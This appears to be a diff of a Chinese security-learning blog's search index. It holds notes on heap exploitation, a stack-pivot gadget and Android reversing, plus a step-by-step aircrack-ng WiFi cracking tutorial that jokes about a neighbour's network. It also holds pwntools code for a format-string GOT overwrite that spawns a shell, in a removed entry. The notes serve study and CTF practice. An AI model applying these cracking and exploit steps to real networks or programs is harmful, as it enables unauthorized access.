@@ -1,12 +1,173 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Armitage</title>
-    <url>/2025/03/17/Armitage/</url>
-    <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
-</blockquote>
+    <title>House Of 系列堆漏洞利用方法整理</title>
+    <url>/2025/05/01/House-Of-%E7%B3%BB%E5%88%97%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/</url>
+    <content><![CDATA[<table>
+<thead>
+<tr>
+<th>名称及学习时间</th>
+<th>利用步骤</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>House of botcake</strong><br /># 堆风水<br /># Glibc 2.39<br />(2025&#x2F;5&#x2F;1)</td>
+<td>Step 1：分配出9个Size相同且大于0x80的 Chunk（可能需要多一个使其与Top Chunk分隔开）<br />Step 2：释放7个Chunk，填满对应的Tcache Bin<br />Step 3：释放第8个Chunk（Chunk A），进入Unosrted Bin<br />Step 4：释放第9个Chunk（Chunk B），将会引发Chunk A与Chunk B合并<br />Step 5：从该大小的Tcache Bin中分配出1个Chunk，给Double Chun B让位<br />Step 6：再次释放Chunk B，进入Tcache<br />Finish：此时Chunk B同时存在于Unsorted Bin与Tcache中</td>
+</tr>
+</tbody></table>
 ]]></content>
+  </entry>
+  <entry>
+    <title>_IO_FILE漏洞</title>
+    <url>/2025/04/14/IO-FILE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://blog.csdn.net/weixin_59166557/article/details/143376038">CTF-PWN: 什么是_IO_FILE?-CSDN</a><br><a href="https://elixir.bootlin.com/glibc/">源码查看网站bootlin</a></p>
+<h1 id="核心源码"><a href="#核心源码" class="headerlink" title="核心源码"></a>核心源码</h1>]]></content>
+  </entry>
+  <entry>
+    <title>Javascript</title>
+    <url>/2025/04/28/Javascript/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Manim安装教程</title>
+    <url>/2025/03/23/Manim%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<ol>
+<li>进入官网安装页 <a href="https://chocolatey.org/install">Chocolatey Software | Installing Chocolatey</a> （Windows支持的包管理器）</li>
+<li>把官网给出的安装命令复制下来</li>
+<li>打开windows powershell</li>
+<li>把复制下来的命令粘贴进去</li>
+<li>安装依赖：<code>choco install -y python ffmpeg latex miktex git</code></li>
+<li>安装Manim：<code>pip install manim</code></li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
+    <title>kali+无线网卡破解wifi密码</title>
+    <url>/2024/07/26/kali+%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="虚拟机-无线网卡（推荐）"><a href="#虚拟机-无线网卡（推荐）" class="headerlink" title="虚拟机+无线网卡（推荐）"></a>虚拟机+无线网卡（推荐）</h1><h2 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h2><ol>
+<li>安装有kali虚拟机的电脑，最好别用wsl（会有一些莫名其妙的错误）</li>
+<li>无线网卡一枚（最好免驱），网购约30元，我使用的是mt7601u</li>
+<li>字典（自己生成或者网上下载如Top100）</li>
+<li><del>邻居家的wifi</del></li>
+</ol>
+<h2 id="将无线网卡连接至虚拟机"><a href="#将无线网卡连接至虚拟机" class="headerlink" title="将无线网卡连接至虚拟机"></a>将无线网卡连接至虚拟机</h2><p>请务必先打开kali虚拟机后，后将无线网卡插上电脑。</p>
+<p>这样在VMwwre中才会出现一个弹窗“检测到新的usb设备”选择“连接到虚拟机”，选中你的虚拟机点确定</p>
+<p>打开终端，输入<code>ifconfig</code>，如果列出的表中有<code>wlan0</code>，则说明无线网卡已经成功连接到kali虚拟机中</p>
+<p><img src="https://s2.loli.net/2024/11/28/TAnbiq8o3svLEOp.png" alt=" 2024-11-28 190541.png"></p>
+<h2 id="开启监听模式"><a href="#开启监听模式" class="headerlink" title="开启监听模式"></a>开启监听模式</h2><p>开启网卡监听（注意下面图片中的monitor mode enable，表示监听模式启动）</p>
+<pre><code class="highlight bash">airmon-ng start wlan0</code></pre>
+
+<p><img src="https://s2.loli.net/2024/11/28/CPBGWlVsOyNZX3c.png" alt=" 2024-11-28 190808.png"></p>
+<p>扫描附近的wifi，搜索到你要破解的wifi的名字时，及时按下<code>空格</code>暂停扫描，以免扫描的东西不见了，也方便复制：</p>
+<pre><code class="highlight bash">airodump-ng wlan0</code></pre>
+<table>
+<thead>
+<tr>
+<th align="center">BSSID</th>
+<th align="center">CH</th>
+<th align="center">ESSID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">wifi的网卡</td>
+<td align="center">信道</td>
+<td align="center">wifi的名字</td>
+</tr>
+</tbody></table>
+<p><img src="https://s2.loli.net/2024/11/28/R3flWUaoHMkh1uX.png" alt=" 2024-11-28 191752.png"></p>
+<p>这时候最好不要按Ctrl+C退出上一步，最好是再打开一个控制台窗口，查看wifi连接的设备</p>
+<pre><code class="highlight bash">airodump-ng --bssid &lt;BSSID&gt; -c &lt;CH&gt; -w &lt;文件名不用自己加后缀&gt; wlan0</code></pre>
+
+<p>抓包</p>
+<pre><code class="highlight bash">aireplay-ng -0 2 -a &lt;BSSID&gt; -c &lt;STATION&gt; wlan0</code></pre>
+<p>参数说明：-0抓取包的个数，-a路由器MAC，-c用户MAC</p>
+<p>破解wifi密码，跑包，如果密码字典中有密码，即可破解成功</p>
+<pre><code class="highlight bash">aircrack-ng -w &lt;字典路径&gt; &lt;文件名不用自己加后缀&gt;</code></pre>
+
+<p>停止监听</p>
+<pre><code class="highlight bash">airmon stop wlan0</code></pre>
+
+<h1 id="WSL-无线网卡（无效）"><a href="#WSL-无线网卡（无效）" class="headerlink" title="WSL+无线网卡（无效）"></a>WSL+无线网卡（无效）</h1><h2 id="使用USBIPD将无线网卡绑定到WSL"><a href="#使用USBIPD将无线网卡绑定到WSL" class="headerlink" title="使用USBIPD将无线网卡绑定到WSL"></a>使用USBIPD将无线网卡绑定到WSL</h2><p>参考文档：<a href="https://learn.microsoft.com/zh-cn/windows/wsl/connect-usb">Microsoft-连接USB设备</a></p>
+<p>你有两种方式安装usbipd</p>
+<p>第一种，在GitHub发布页中下载<a href="https://github.com/dorssel/usbipd-win/releases">https://github.com/dorssel/usbipd-win/releases</a>，下载usbipd-win_x.x.x.msi，然后安装即可</p>
+<p>第二种，如果你的Windows有安装winget，那么可以通过输入命令来安装</p>
+<pre><code class="highlight shell">winget install --interactive --exact dorssel.usbipd-win</code></pre>
+
+<p>安装好usbipd后，打开powershell（以管理员模式打开），先别着急打开wsl</p>
+<p>确保你的无线网卡插入了电脑后，输入查看</p>
+<pre><code class="highlight shell">usbipd list</code></pre>
+
+<p><img src="https://s2.loli.net/2024/11/28/spBltRFcGbKHQiN.png" alt=" 2024-11-28 140241.png"></p>
+<p>我们可以看到，我的无线网卡名称为<strong>802.11n USB Wireless LAN Card</strong>，它的<strong>BUSID</strong>为<strong>2-1</strong></p>
+<p>接下来输入命令使无线网卡处于共享状态</p>
+<pre><code class="highlight shell">usbipd bind --busid &lt;busid&gt;</code></pre>
+
+
+
+<p><img src="https://s2.loli.net/2024/11/28/ae4GZQ273wJsPbo.png" alt=" 2024-11-28 140719.png"></p>
+<p>通过后面的命令我们可以看到，我的无线网卡已经处于<strong>Shared</strong>的状态，那我们就可以将其绑定到WSL中（在此之前需要先打开WSL，否则可能会报错)：</p>
+<pre><code class="highlight shell">usbipd attach --wsl --busid &lt;busid&gt;</code></pre>
+
+<p><img src="https://s2.loli.net/2024/11/28/jdSRNucyM35Aktg.png" alt=" 2024-11-28 141405.png"></p>
+<p>这里附一条解除绑定的命令（别乱输啊），不过官方文档是说也可以通过物理移除的方式（通俗的讲就是直接拔）：</p>
+<pre><code class="highlight shell">usbipd detach --busid &lt;busid&gt;</code></pre>
+
+
+
+<p>到此，你的Windows可能会弹出一条移除设备的信息，并且在Windows下的WLAN也看不到了两张网卡，这是正常现象，它说明你已经成功的将无线网卡添加到了WSL中。</p>
+<p>我们不妨进一步进行验证 。切换到WSL的窗口，输入<code>lsusb</code>可以查看接入的USB：</p>
+<p><img src="https://s2.loli.net/2024/11/28/2hnLKbeyFcWqkQP.png" alt=" 2024-11-28 141854.png"></p>
+<p>其中的<strong>Ralink Technology, Corp. MT7601U Wireless Adapter</strong>就是我的网卡，显然，USB添加成功了。</p>
+<p>但是，输入<code>ifconfig</code>查看，好家伙没有无线网。。。（好吧，我承认到此我不会了</p>
+<h1 id="Windows-无线网卡"><a href="#Windows-无线网卡" class="headerlink" title="Windows+无线网卡"></a>Windows+无线网卡</h1><p>去<a href="https://www.aircrack-ng.org/">Aircrack-ng官网</a>下载工具，Windows版本包含以下工具</p>
+<table>
+<thead>
+<tr>
+<th>命令（有用的）</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>airbase-ng</td>
+<td></td>
+</tr>
+<tr>
+<td>aircrack-ng</td>
+<td>最后破解：破解WEP以及WPA（字典攻击）密钥</td>
+</tr>
+<tr>
+<td>airdecap-ng</td>
+<td></td>
+</tr>
+<tr>
+<td>airdecloak-ng</td>
+<td></td>
+</tr>
+<tr>
+<td>aireplay-ng</td>
+<td></td>
+</tr>
+<tr>
+<td>airodump-ng</td>
+<td>数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息</td>
+</tr>
+<tr>
+<td>airserv-ng</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+]]></content>
+      <tags>
+        <tag>kali</tag>
+      </tags>
   </entry>
   <entry>
     <title>PWN环境搭建</title>
@@ -37,383 +198,36 @@ python3 setup.py install</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>主动扫描</title>
-    <url>/2025/03/17/%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F/</url>
-    <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
-</blockquote>
-<h3 id="对单台设备进行扫描"><a href="#对单台设备进行扫描" class="headerlink" title="对单台设备进行扫描"></a>对单台设备进行扫描</h3><pre><code class="highlight bash"><span class="comment"># 比如我对github.com的扫描（不要抓我）</span>
-<span class="comment"># nmap github.com</span>
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 19:08 CST <span class="comment"># 告诉你了Nmap的版本，和扫描的时间</span>
-Nmap scan report <span class="keyword">for</span> github.com (20.205.243.166) <span class="comment"># 给出设备的IP地址</span>
-Host is up (0.12s latency). <span class="comment"># 给出目标设备的状态为up，使用-sn</span>
-Not shown: 997 filtered tcp ports (no-response) <span class="comment"># 997个端口是关闭的，也就是说有3个是开放的</span>
-PORT    STATE SERVICE <span class="comment">#这三个端口的信息：端口、状态、服务</span>
-22/tcp  open  ssh
-80/tcp  open  http
-443/tcp open  https
+    <title>借助svcudp进行栈迁移</title>
+    <url>/2025/05/05/%E5%80%9F%E5%8A%A9svcudp%E8%BF%9B%E8%A1%8C%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
+    <content><![CDATA[<p>在libc.so.6文件中存在一个被去符号的函数——svcudp_reply，它含有如下gadget：</p>
+<pre><code class="highlight asm">mov     rbp, [rdi+48h]          ; 写入rbp的地址
+mov     rax, [rbp+18h]          ；确保rbp+0x18的位置，是leave ; ret的.text地址的地址-0x28（有点拗口）
+lea     r13, [rbp+10h]
+mov     dword ptr [rbp+10h], 0  ; 确保rbp+0x10位置可写
+mov     rdi, r13
+call    qword ptr [rax+28h]     ; 调用leave ; ret</code></pre>
 
-Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 10.35 seconds <span class="comment"># 共对1台设备进行扫描，发现1台状态为up的设备</span></code></pre>
+<p>在IDA中可以通过搜索汇编指令搜索到，推荐搜索以下两条指令，它们的搜索结果是最少的：</p>
+<pre><code class="highlight asm">mov     rbp, [rdi+48h]
+lea     r13, [rbp+10h]</code></pre>
 
+<p>在rdi可控且写入数据的地址可获得的情况下，可以借助此gadget栈迁移到任意位置。</p>
+<p>在只能执行一个函数的情况下，十分适合使用此方法，继续执行ROP调用更多函数。</p>
 ]]></content>
-      <tags>
-        <tag>kali</tag>
-      </tags>
   </entry>
   <entry>
-    <title>PWN学习笔记</title>
-    <url>/2025/01/28/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h3 id="如何将printf的GOT表改为system的GOT表"><a href="#如何将printf的GOT表改为system的GOT表" class="headerlink" title="如何将printf的GOT表改为system的GOT表"></a>如何将printf的GOT表改为system的GOT表</h3><p>在PWN攻击中将<code>printf</code>的GOT地址覆盖为<code>system</code>的GOT地址，可通过以下步骤实现：</p>
-<h4 id="1-获取关键地址"><a href="#1-获取关键地址" class="headerlink" title="1. 获取关键地址"></a>1. <strong>获取关键地址</strong></h4><ul>
-<li><strong>泄漏<code>printf</code>的GOT地址</strong>：通过<code>objdump -R &lt;binary&gt;</code>查找<code>printf@got</code>的地址（如<code>0x0804a010</code>）。</li>
-<li><strong>泄漏<code>printf</code>的实际地址</strong>：利用格式化字符串漏洞（如<code>%3$s</code>）读取该GOT地址内容，得到<code>printf</code>在libc中的地址。</li>
-<li><strong>计算<code>system</code>地址</strong>：基于libc基址（<code>printf泄漏地址 - printf偏移</code>）和<code>system</code>的偏移，得到<code>system</code>的实际地址。</li>
-</ul>
-<h4 id="2-构造覆盖Payload"><a href="#2-构造覆盖Payload" class="headerlink" title="2. 构造覆盖Payload"></a>2. <strong>构造覆盖Payload</strong></h4><p>假设需要将<code>system</code>的地址（如<code>0xb7e3bda0</code>）写入<code>printf@got</code>（<code>0x0804a010</code>），分两次写入：</p>
-<pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-
-printf_got = <span class="number">0x0804a010</span>
-system_addr = <span class="number">0xb7e3bda0</span>
-
-<span class="comment"># 拆分地址为高位和低位（16位）</span>
-high = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>  <span class="comment"># 0xb7e3</span>
-low = system_addr &amp; <span class="number">0xffff</span>           <span class="comment"># 0xbda0</span>
-
-payload = p32(printf_got) + p32(printf_got + <span class="number">2</span>)  <span class="comment"># 小端序写入地址</span>
-payload += <span class="string">f&quot;%<span class="subst">&#123;low - <span class="number">8</span>&#125;</span>x%7$hn&quot;</span>.encode()          <span class="comment"># 写入低位</span>
-payload += <span class="string">f&quot;%<span class="subst">&#123;high - low&#125;</span>x%8$hn&quot;</span>.encode()       <span class="comment"># 写入高位</span></code></pre>
-
-<h4 id="3-触发漏洞"><a href="#3-触发漏洞" class="headerlink" title="3. 触发漏洞"></a>3. <strong>触发漏洞</strong></h4><p>将Payload发送给存在格式化字符串漏洞的程序，触发<code>printf</code>执行，覆盖GOT表。</p>
-<h4 id="4-执行system"><a href="#4-执行system" class="headerlink" title="4. 执行system"></a>4. <strong>执行system</strong></h4><p>后续调用<code>printf</code>时实际执行<code>system</code>，传入参数需为命令字符串（如<code>/bin/sh</code>）。</p>
-<h4 id="示例利用代码"><a href="#示例利用代码" class="headerlink" title="示例利用代码"></a>示例利用代码</h4><pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-
-p = process(<span class="string">&#x27;./vulnerable_binary&#x27;</span>)
-
-<span class="comment"># 泄漏printf地址</span>
-payload_leak = p32(<span class="number">0x0804a010</span>) + <span class="string">b&quot;%3$s&quot;</span>
-p.sendline(payload_leak)
-printf_addr = u32(p.recv(<span class="number">4</span>))
-
-<span class="comment"># 计算system地址（假设已知libc版本）</span>
-libc_base = printf_addr - <span class="number">0x0004a0</span>  <span class="comment"># 替换为实际偏移</span>
-system_addr = libc_base + <span class="number">0x0003b0</span>  <span class="comment"># 替换为实际偏移</span>
-
-<span class="comment"># 构造覆盖Payload</span>
-high = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>
-low = system_addr &amp; <span class="number">0xffff</span>
-
-payload = p32(<span class="number">0x0804a010</span>) + p32(<span class="number">0x0804a012</span>)
-payload += <span class="string">f&quot;%<span class="subst">&#123;low - <span class="number">8</span>&#125;</span>x%7$hn&quot;</span>.encode() <span class="comment"># 上面一行已经占了8个字符，所以是low-8</span>
-payload += <span class="string">f&quot;%<span class="subst">&#123;high - low&#125;</span>x%8$hn&quot;</span>.encode()
-
-p.sendline(payload)
-p.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)  <span class="comment"># 下一次调用printf(&quot;/bin/sh&quot;)会执行system(&quot;/bin/sh&quot;)</span>
-p.interactive()</code></pre>
-
+    <title>python</title>
+    <url>/2025/04/28/python/</url>
+    <content><![CDATA[<h1 id="python异常处理"><a href="#python异常处理" class="headerlink" title="python异常处理"></a>python异常处理</h1><pre><code class="highlight python"><span class="keyword">try</span>:
+&lt;语句&gt;        <span class="comment">#运行别的代码</span>
+<span class="keyword">except</span> &lt;名字&gt;：
+&lt;语句&gt;        <span class="comment">#如果在try部份引发了&#x27;name&#x27;异常</span>
+<span class="keyword">except</span> &lt;名字&gt;，&lt;数据&gt;:
+&lt;语句&gt;        <span class="comment">#如果引发了&#x27;name&#x27;异常，获得附加的数据</span>
+<span class="keyword">else</span>:
+&lt;语句&gt;        <span class="comment">#如果没有异常发生</span></code></pre>
 ]]></content>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Metasploit制作木马</title>
-    <url>/2025/03/12/Metasploit%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC/</url>
-    <content><![CDATA[<p>打开linux命令行，输入msfconsole进入msf命令行</p>
-<pre><code class="highlight msfconsole">search [name]</code></pre>
-
-<table>
-<thead>
-<tr>
-<th align="center">模块类型</th>
-<th align="center">功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">exploit</td>
-<td align="center">攻击</td>
-</tr>
-<tr>
-<td align="center">auxiliary</td>
-<td align="center">辅助探测</td>
-</tr>
-</tbody></table>
-<pre><code class="highlight msfconsole">use 0
-use [name]</code></pre>
-
-<pre><code class="highlight plaintext">show options</code></pre>]]></content>
-      <tags>
-        <tag>MSF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>拒绝服务攻击</title>
-    <url>/2025/03/17/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基于结构化异常处理的渗透</title>
-    <url>/2025/03/17/%E5%9F%BA%E4%BA%8E%E7%BB%93%E6%9E%84%E5%8C%96%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Android逆向学习</title>
-    <url>/2025/03/13/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="安卓逆向学习路径"><a href="#安卓逆向学习路径" class="headerlink" title="安卓逆向学习路径"></a>安卓逆向学习路径</h1><h2 id="阶段一：基础准备"><a href="#阶段一：基础准备" class="headerlink" title="阶段一：基础准备"></a><strong>阶段一：基础准备</strong></h2><table>
-<thead>
-<tr>
-<th align="left"><strong>学习目标</strong></th>
-<th align="left"><strong>关键内容</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><strong>1. Android开发基础</strong></td>
-<td align="left">- APK组成结构（<a href="https://chat.openai.com/">前文已学</a>） - 四大组件工作原理 - JNI与NDK开发流程</td>
-</tr>
-<tr>
-<td align="left"><strong>2. 编程语言</strong></td>
-<td align="left">- Java&#x2F;Kotlin基础语法 - Smali汇编语法（寄存器操作、指令集） - ARM&#x2F;ARM64汇编基础</td>
-</tr>
-<tr>
-<td align="left"><strong>3. 工具链入门</strong></td>
-<td align="left">- ADB调试命令 - Android Studio Profiler - 基础Linux命令（grep, awk等）</td>
-</tr>
-</tbody></table>
-<h2 id="阶段二：静态分析技术"><a href="#阶段二：静态分析技术" class="headerlink" title="阶段二：静态分析技术"></a><strong>阶段二：静态分析技术</strong></h2><table>
-<thead>
-<tr>
-<th align="left"><strong>技术方向</strong></th>
-<th align="left"><strong>工具与技能</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><strong>1. 反编译工具</strong></td>
-<td align="left">- Apktool（资源反编译） - Jadx&#x2F;Ghidra（Java代码还原） - IDA Pro（Native层分析）</td>
-</tr>
-<tr>
-<td align="left"><strong>2. 资源解析</strong></td>
-<td align="left">- 修改<code>resources.arsc</code> - 动态库（.so）的ELF结构解析 - 调试符号剥离与恢复</td>
-</tr>
-<tr>
-<td align="left"><strong>3. 代码混淆对抗</strong></td>
-<td align="left">- ProGuard规则逆向 - 字符串加密识别 - 控制流平坦化破解</td>
-</tr>
-</tbody></table>
-<h2 id="阶段三：动态调试技术"><a href="#阶段三：动态调试技术" class="headerlink" title="阶段三：动态调试技术"></a><strong>阶段三：动态调试技术</strong></h2><table>
-<thead>
-<tr>
-<th align="left"><strong>调试环境</strong></th>
-<th align="left"><strong>技术要点</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><strong>1. Java层调试</strong></td>
-<td align="left">- Xposed框架Hook - Frida脚本编写（JavaScript&#x2F;Python） - DDMS方法追踪</td>
-</tr>
-<tr>
-<td align="left"><strong>2. Native层调试</strong></td>
-<td align="left">- IDA Pro动态调试.so - GDB&#x2F;LLDB附加进程 - Frida Stalker内存追踪</td>
-</tr>
-<tr>
-<td align="left"><strong>3. 系统级监控</strong></td>
-<td align="left">- 内核模块注入（需Root） - SELinux策略绕过 - Binder通信流量抓取</td>
-</tr>
-</tbody></table>
-<h2 id="阶段四：进阶逆向技术"><a href="#阶段四：进阶逆向技术" class="headerlink" title="阶段四：进阶逆向技术"></a><strong>阶段四：进阶逆向技术</strong></h2><table>
-<thead>
-<tr>
-<th align="left"><strong>高级主题</strong></th>
-<th align="left"><strong>技术细节</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><strong>1. 加固对抗</strong></td>
-<td align="left">- 脱壳技术（DexClassLoader内存Dump） - 自定义类加载器分析 - VMP保护破解</td>
-</tr>
-<tr>
-<td align="left"><strong>2. 协议逆向</strong></td>
-<td align="left">- HTTPS流量中间人攻击（Charles+Postern） - Protobuf&#x2F;FlatBuffers反序列化</td>
-</tr>
-<tr>
-<td align="left"><strong>3. 漏洞挖掘</strong></td>
-<td align="left">- 组件暴露攻击（Exported Activity） - JNI层整数溢出漏洞 - 权限提升漏洞</td>
-</tr>
-</tbody></table>
-<h1 id="APK文件"><a href="#APK文件" class="headerlink" title="APK文件"></a>APK文件</h1><h2 id="APK文件结构"><a href="#APK文件结构" class="headerlink" title="APK文件结构"></a>APK文件结构</h2><table>
-<thead>
-<tr>
-<th align="center">文件&#x2F;文件夹</th>
-<th align="left">功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center"><font color="red">AndroidManifest.xml</font></td>
-<td align="left"><strong>核心配置文件</strong>：声明包名、版本、权限、四大组件（Activity&#x2F;Service&#x2F;BroadcastReceiver&#x2F;ContentProvider）及硬件需求（如摄像头）</td>
-</tr>
-<tr>
-<td align="center"><font color="red">classes.dex</font></td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="center"><font color="red">resources.arsc</font></td>
-<td align="left"><strong>资源索引表</strong>：编译后的资源ID映射（如字符串、布局），加速资源加载。</td>
-</tr>
-<tr>
-<td align="center"><font color="green">assets&#x2F;</font></td>
-<td align="left"><strong>原始资源</strong>：未编译的字体、音频等，通过<code>AssetManager</code>访问。</td>
-</tr>
-<tr>
-<td align="center"><font color="green">lib&#x2F;</font></td>
-<td align="left"><strong>原生库（.so文件）</strong>：按CPU架构分目录（如<code>arm64-v8a</code>、<code>x86_64</code>），用于C&#x2F;C++代码。</td>
-</tr>
-<tr>
-<td align="center"><font color="green">res&#x2F;</font></td>
-<td align="left"><strong>编译后的资源文件</strong>，子目录包括： <br /> <code>drawable/</code>：图片（PNG&#x2F;JPG）和矢量图（XML）。<br /> <code>layout/</code>：UI布局XML。<br /> <code>values/</code>：字符串（<code>strings.xml</code>）、颜色、尺寸等。<br /> <code>mipmap/</code>：应用图标（适配不同DPI）。<br /> <code>anim/</code>、<code>xml/</code>等：动画及自定义XML配置。</td>
-</tr>
-<tr>
-<td align="center"><font color="green">META-INF&#x2F;</font></td>
-<td align="left"><strong>签名及校验文件</strong>： <br /> <code>MANIFEST.MF</code>：文件哈希列表。<br /> <code>CERT.SF</code>：哈希签名。<br /> <code>CERT.RSA</code>：开发者证书和数字签名。</td>
-</tr>
-</tbody></table>
-<h2 id="APK打包流程"><a href="#APK打包流程" class="headerlink" title="APK打包流程"></a>APK打包流程</h2><p><img src="https://s2.loli.net/2025/03/14/FbVn3ulNWkHq14L.jpg" alt="apk.jpg"></p>
-<h2 id="APK安装流程（我也看不懂）"><a href="#APK安装流程（我也看不懂）" class="headerlink" title="APK安装流程（我也看不懂）"></a>APK安装流程（我也看不懂）</h2><table>
-<thead>
-<tr>
-<th align="left"><strong>阶段</strong></th>
-<th align="left"><strong>关键动作</strong></th>
-<th align="left"><strong>技术点&#x2F;组件</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><strong>1. 安装触发</strong></td>
-<td align="left">- 识别安装来源（ADB&#x2F;应用商店&#x2F;文件管理器） - 检查未知来源权限和调用方权限</td>
-<td align="left"><code>PackageInstaller</code> <br /><code>InstallSourceVerifyer</code> <br /><code>INSTALL_PACKAGES</code>权限</td>
-</tr>
-<tr>
-<td align="left"><strong>2. 预处理</strong></td>
-<td align="left">- APK复制到安全临时目录 - 签名验证（V1&#x2F;V2&#x2F;V3）</td>
-<td align="left"><code>/data/app/vmdl*.tmp</code> <br /><code>META-INF/</code>签名文件 <br /><code>ApkSignatureVerifier</code></td>
-</tr>
-<tr>
-<td align="left"><strong>3. 系统服务处理</strong></td>
-<td align="left">- 解析<code>AndroidManifest.xml</code> - 检查SDK版本兼容性&#x2F;权限声明&#x2F;依赖库</td>
-<td align="left"><code>PackageParser</code> <br /><code>PackageManagerService</code> <br /><code>&lt;uses-feature&gt;</code>校验</td>
-</tr>
-<tr>
-<td align="left"><strong>4. 编译优化</strong></td>
-<td align="left">- DEX转OAT机器码（AOT编译） - 资源表优化</td>
-<td align="left"><code>dex2oat</code> <br /><code>/data/app/包名/oat/</code> <br /><code>ResourceTypes.cpp</code>（资源编译逻辑）</td>
-</tr>
-<tr>
-<td align="left"><strong>5. 数据持久化</strong></td>
-<td align="left">- 更新系统数据库（包信息&#x2F;权限映射） - 创建应用专属目录</td>
-<td align="left"><code>packages.xml</code> <br /><code>/data/app/包名/</code> <br /><code>lib/</code>（原生库目录）</td>
-</tr>
-<tr>
-<td align="left"><strong>6. 安装后处理</strong></td>
-<td align="left">- 发送系统广播通知安装完成 - 触发后台二次优化</td>
-<td align="left"><code>BroadcastQueue</code> <br /><code>Intent.ACTION_PACKAGE_ADDED</code> <br /><code>BackgroundDexOptService</code></td>
-</tr>
-<tr>
-<td align="left"><strong>异常处理</strong></td>
-<td align="left">- 签名冲突&#x2F;解析失败&#x2F;存储不足等错误处理</td>
-<td align="left"><code>INSTALL_FAILED_*</code>错误码 <br /><code>PackageManager</code>日志（&#96;adb logcat</td>
-</tr>
-</tbody></table>
-]]></content>
-      <tags>
-        <tag>Reverse Engineering</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>无线安全渗透测试</title>
-    <url>/2025/03/17/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>漏洞扫描技术</title>
-    <url>/2025/03/17/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>查找libc对应ld的方法</title>
-    <url>/2025/02/06/%E6%9F%A5%E6%89%BElibc%E5%AF%B9%E5%BA%94ld%E7%9A%84%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<ul>
-<li>Step 1<pre><code class="highlight bash">strings &lt;libc_file_name&gt; | grep <span class="string">&quot;Ubuntu&quot;</span>
-GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.8) stable release version 2.35. <span class="comment"># 该例子中的libc版本是2.35</span></code></pre></li>
-<li>Step 2</li>
-</ul>
-<pre><code class="highlight URL">https://launchpad.net/ubuntu/xxx/amd64/libc6/</code></pre>
-
-<p>上面的xxxx是Ubuntu的版本名称（全小写），可以查下表：</p>
-<table>
-<thead>
-<tr>
